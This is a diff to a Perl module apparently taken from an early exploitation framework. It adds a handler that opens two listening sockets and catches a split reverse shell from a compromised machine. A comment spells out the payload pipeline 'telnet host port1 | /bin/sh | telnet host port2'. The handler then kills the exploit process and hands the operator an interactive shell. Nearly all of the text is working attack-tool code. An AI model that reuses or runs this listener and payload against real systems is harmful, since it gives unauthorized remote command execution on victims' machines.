@@ -473,4 +473,115 @@ sub reverse_shell_xor
     return(1);
 }
 
+
+# Handles telnet host port1 | /bin/sh | telnet host port2
+sub reverse_shell_split
+{
+    my ($self, $exploit) = @_;
+    
+    my $sA = IO::Socket::INET->new (
+                Proto => "tcp",
+                LocalPort => $self->GetVar('LPORTA'),
+                Type => SOCK_STREAM,
+                ReuseAddr => 1,
+                Listen => 3
+    );
+
+    my $sB = IO::Socket::INET->new (
+                Proto => "tcp",
+                LocalPort => $self->GetVar('LPORTB'),
+                Type => SOCK_STREAM,
+                ReuseAddr => 1,
+                Listen => 3
+    );
+
+    if (! $sA || ! $sB)
+    {
+        $self->set_error("could not start listener A: $!");
+        return undef;
+    }
+
+
+    # put servers into non-blocking mode
+    Pex::Unblock($sA);
+    Pex::Unblock($sB);
+    
+    my $stopserver = 0;
+    
+    my %OSIG;
+    $OSIG{"TERM"} = $SIG{"TERM"};
+    $OSIG{"INT"}  = $SIG{"INT"};
+    
+    $SIG{"TERM"} = sub { $stopserver++ };
+    $SIG{"INT"}  = sub { $stopserver++ };
+
+    my $sel = IO::Select->new();
+    $sel->add($sA);
+    $sel->add($sB);
+    
+    my ($connA, $connB) = (0,0);
+    
+    while (! $stopserver)
+    {
+        my @X = $sel->can_read(0.5);
+        foreach my $s (@X)
+        {
+            if ($s eq $sA && ! $connA)
+            {
+                $connA = $sA->accept();
+                print STDERR "[*] Connection to listener A from " . $connA->peerhost() . ":" . $connA->peerport() . "\n";
+                next;
+            }
+            if ($s eq $sB && ! $connB)
+            {
+                $connB = $sB->accept();
+                print STDERR "[*] Connection to listener B from " . $connB->peerhost() . ":" . $connB->peerport() . "\n";
+                next;
+            }
+        }
+        
+        if ($connA && $connB)
+        {
+            print STDERR "[*] Both connections are established, dropping to shell...\n\n";
+ 
+            $stopserver++;
+
+            # terminate the exploit process
+            kill(9, $exploit);
+
+            my $console = $self->ConsoleStart();
+            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+            $callback->("CONNECT", $connA);
+
+            $self->DataPumpSplit($console, $connA, $connB, $callback);
+
+            $self->ConsoleStop($console);
+            $callback->("DISCONNECT", $connA);
+            
+            $connA->close();
+            $connB->close();
+            
+        }
+        # work around a massive array of win32 signaling bugs
+        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
+    }
+
+    # make sure the exploit child process is dead
+    if (kill(0, $exploit)) { kill("TERM", $exploit) }
+
+    # clean up the listening sockets
+    $sA->shutdown(2);
+    $sB->shutdown(2);
+    $sA->close();
+    $sA->close();
+
+
+    $SIG{"TERM"} = $OSIG{"TERM"};
+    $SIG{"INT"}  = $OSIG{"INT"};
+
+    # return back to the calling module
+    print STDERR "[*] Exiting Shell Listener...\n";
+    return(1);
+}
+
 1;
